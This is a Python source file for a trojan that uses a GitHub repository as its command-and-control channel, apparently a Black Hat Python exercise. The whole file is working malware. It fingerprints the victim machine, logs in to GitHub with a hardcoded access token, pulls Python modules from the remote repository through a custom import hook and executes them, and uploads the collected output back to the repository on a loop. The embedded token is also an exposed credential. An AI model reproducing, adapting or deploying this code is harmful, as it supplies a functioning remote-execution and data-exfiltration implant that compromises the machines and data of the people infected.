#ch7_github_trojan.py
from github3 import login
from datetime import datetime
from uuid import getnode
import platform
import base64
import json
import imp
import queue
import threading
import random
import sys
import _strptime
import time

#Define global variables
gh_username = "aberlanga25"
gh_repo = "BlackHat"
gh_remote = "data/"

#We generate a trojan_id. If this id is not available in our github config folder,
#we will resort to using the default config file for this trojan.
#We define some other constants related to the trojan
trojan_id = base64.b64encode((platform.node() + "-" + hex(getnode())).encode()).decode("utf-8")
trojan_id_default = base64.b64encode("default".encode()).decode("utf-8")
trojan_config_file_path = f"Trojan/config/{trojan_id}.json"
trojan_default_config_file_path = f"Trojan/config/{trojan_id_default}.json"
trojan_module_folder_path = "Trojan/modules/"
trojan_output_file_name = datetime.utcnow().isoformat() + "-" + trojan_id
trojan_output_file_path = "Trojan/data/" + trojan_output_file_name
trojan_output_file_contents = ""

task_queue = queue.Queue()

#GitImporter Class to allow import of our custom python modules from github
class GitImporter(object):
    def __init__(self):
        self.module_code = None

    def find_module(self, name, path=None):
        module_file_contents = get_file_contents(trojan_module_folder_path + name + ".py")
        if module_file_contents:
            self.module_code = module_file_contents
            return self

    def load_module(self, name):
        new_module = imp.new_module(name)
        exec(self.module_code, new_module.__dict__)
        sys.modules[name] = new_module
        return new_module

#Connect to Github Function and return its object, along with repository and branch objects
def gh_connect():
    gh = login(token="4560219cd4f2785f528e3ebc0f0845989ffc3820")
    repo = gh.repository(gh_username, gh_repo)
    branch = repo.branch("origin")
    return gh, repo, branch

#Grab the file contents according to the path location. The file is encoded in base64 so it needs to be decoded
#If there is a problem or file is not found, return None
def get_file_contents(file_path):
    gh, repo, branch = gh_connect()
    if gh and repo and branch:
        hash_list = branch.commit.commit.tree.recurse().tree
        for hash in hash_list:
            if file_path in hash.path:
                file_contents_b64 = repo.blob(hash.sha).content
                file_contents = base64.b64decode(file_contents_b64).decode("utf-8")
                return file_contents
    return None

#Grab the file sha according to the path location.
#If there is a problem or file is not found, return None
def get_file_sha(file_path):
    gh, repo, branch = gh_connect()
    if gh and repo and branch:
        hash_list = branch.commit.commit.tree.recurse().tree
        for hash in hash_list:
            if file_path in hash.path:
                return hash.sha
    return None

#This method will load the modules in the trojan config file from either sys.modules
#or resort to importing from github using the GitImporter class. The method will return
#the parsed dict to allow executing the imported modules
def load_trojan_config():
    global trojan_output_file_contents

    def load_modules(config_file_path, config_file_contents):
        global trojan_output_file_contents
        trojan_config_file_json = json.loads(config_file_contents)
        for module_dict in trojan_config_file_json:
            module = module_dict["module"]
            if module not in sys.modules:
                exec(f"import {module}")
                loaded_modules.append({"loaded_module": module})
            else:
                loaded_modules.append({"loaded_module": module})
        if len(loaded_modules) == len(trojan_config_file_json):
            trojan_output_file_contents += f"[*] Successful Modules Import From: {config_file_path}\n"
            return trojan_config_file_json
        return None

    loaded_modules = []
    trojan_default_config_file_contents = get_file_contents(trojan_default_config_file_path)
    trojan_config_file_contents = get_file_contents(trojan_config_file_path)

    if trojan_default_config_file_contents and trojan_config_file_contents:
        trojan_output_file_contents += "[*] Using Specific Modules\n"
        return load_modules(trojan_config_file_path, trojan_config_file_contents)
    else:
        trojan_output_file_contents += "[*] Using Default Modules\n"
        return load_modules(trojan_default_config_file_path, trojan_default_config_file_contents)

#Simple method to run each module within the trojan config file
def run_module(module):
    global trojan_output_file_contents
    task_queue.put(1)
    result = sys.modules[module].run()
    trojan_output_file_contents += result + "\n"
    task_queue.get()
    return

#Method to create or update the trojan exfiltrated data obtained from running the modules to github.
def store_output():
    global trojan_output_file_contents
    gh, repo, branch = gh_connect()
    sha = get_file_sha(trojan_output_file_path)
    if sha:
        repo.update_file(trojan_output_file_path, trojan_output_file_name, base64.b64encode(trojan_output_file_contents.encode()), sha)
    else:
        repo.create_file(trojan_output_file_path, trojan_output_file_name, base64.b64encode(trojan_output_file_contents.encode()))
    return

#Required to allow module import from github
sys.meta_path = [GitImporter()]

#main trojan loop
while True:
    trojan_output_file_contents += (100 * "*") + "\n"
    trojan_output_file_contents += f"[*] Running On: {platform.node() + '-' + hex(getnode())}\n"
    trojan_output_file_contents += f"[*] Time: {datetime.utcnow().isoformat()}\n"
    if task_queue.empty():
        loaded_config_file_json = load_trojan_config()
        if loaded_config_file_json:
            for loaded_module in loaded_config_file_json:
                run_module_thread = threading.Thread(target=run_module, args=(loaded_module["module"],))
                run_module_thread.start()
                time.sleep(random.randint(1, 10))
            trojan_output_file_contents += "[*] Finished Executing Modules\n"
            store_output()
    #sleep_time = random.randint(60,120)
    sleep_time = 10
    trojan_output_file_contents += f"[*] Sleeping For {sleep_time} Seconds\n"
    #print(trojan_output_file_contents)
    time.sleep(sleep_time)
